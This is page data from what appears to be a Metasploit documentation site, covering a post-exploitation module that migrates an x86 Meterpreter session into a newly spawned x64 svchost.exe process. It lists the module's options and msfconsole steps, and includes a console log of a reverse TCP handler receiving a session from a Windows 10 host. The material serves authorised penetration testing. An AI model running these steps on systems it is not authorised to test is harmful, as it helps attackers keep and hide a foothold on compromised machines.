{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/archmigrate","result":{"data":{"moduleMetadataJson":{"id":"d8faf121-331e-553f-ac32-0aea2f90eec2","name":"Architecture Migrate","fullname":"post/windows/manage/archmigrate","description":"This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a\n                          new process with the correct architecture and migrates into that process.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/archmigrate","documentationSlug":"/modules/documentation/post/windows/manage/archmigrate","referencesSlug":"/modules/references/post/windows/manage/archmigrate"},"documentation":{"html":"<h2 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h2>\n<p>To use this module you need an x86 executable type meterpreter on a x64 windows machine.</p>\n<p>This module has been tested against:</p>\n<ol>\n<li>Windows 10.</li>\n<li>Windows 7.</li>\n<li>Windows Server 2008R2</li>\n</ol>\n<p>This module was not tested against, but may work against:</p>\n<ol>\n<li>Other versions of Windows that are x64.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>EXE</strong></p>\n<p>The executable to start and migrate into. Default: <code class=\"language-text\">C:\\windows\\sysnative\\svchost.exe</code></p>\n<p><strong>FALLBACK</strong></p>\n<p>If the selected migration executable does not exist, fallback to a sysnative file. Default: <code class=\"language-text\">true</code></p>\n<p><strong>IGNORE_SYSTEM</strong></p>\n<p>Migrate even if you have SYSTEM privileges. Default: <code class=\"language-text\">true</code></p>\n<h3 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h3>\n<ol>\n<li>Start msfconsole</li>\n<li>Obtain a meterpreter session with an executable meterpreter via whatever method</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/archmigrate</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-x64\" style=\"position:relative;\"><a href=\"#windows-10-x64\" aria-label=\"windows 10 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">    msf exploit(handler) &gt; run\n\n    [*] Started reverse TCP handler on &lt;MSF_IP&gt;:4567\n    [*] Starting the payload handler...\n    [*] Sending stage (957487 bytes) to &lt;Win10x64_IP&gt;\n    [*] Meterpreter session 1 opened (&lt;MSF_IP&gt;:4567 -&gt; &lt;Win10x64_IP&gt;:50917) at 2017-03-22 11:43:42 -0500\n\n    meterpreter &gt; sysinfo\n    Computer        : DESKTOP-SO4MCA3\n    OS              : Windows 10 (Build 14393).\n    Architecture    : x64\n    System Language : en_US\n    Domain          : WORKGROUP\n    Logged On Users : 2\n    Meterpreter     : x86/windows\n    meterpreter &gt; background\n    [*] Backgrounding session 1...\n    msf exploit(handler) &gt; use post/windows/manage/archmigrate\n    msf post(archmigrate) &gt; set session 1\n    session =&gt; 1\n    msf post(archmigrate) &gt; run\n\n    [*] The meterpreter is not the same architecture as the OS! Upgrading!\n    [*] Starting new x64 process C:\\windows\\sysnative\\svchost.exe\n    [+] Got pid 1772\n    [*] Migrating..\n    [+] Success!\n    [*] Post module execution completed\n    msf post(archmigrate) &gt; sessions -l\n\n    Active sessions\n    ===============\n\n      Id  Type                     Information                               Connection\n      --  ----                     -----------                               ----------\n      1   meterpreter x64/windows  DESKTOP-SO4MCA3\\tmoose @ DESKTOP-SO4MCA3  &lt;MSF_IP&gt;:4567 -&gt; &lt;Win10x64_IP&gt;:50917 (&lt;Win10x64_IP&gt;)\n\n    msf post(archmigrate) &gt; sessions -i 1\n    [*] Starting interaction with 1...\n\n    meterpreter &gt; sysinfo\n    Computer        : DESKTOP-SO4MCA3\n    OS              : Windows 10 (Build 14393).\n    Architecture    : x64\n    System Language : en_US\n    Domain          : WORKGROUP\n    Logged On Users : 2\n    Meterpreter     : x64/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d8faf121-331e-553f-ac32-0aea2f90eec2"}}}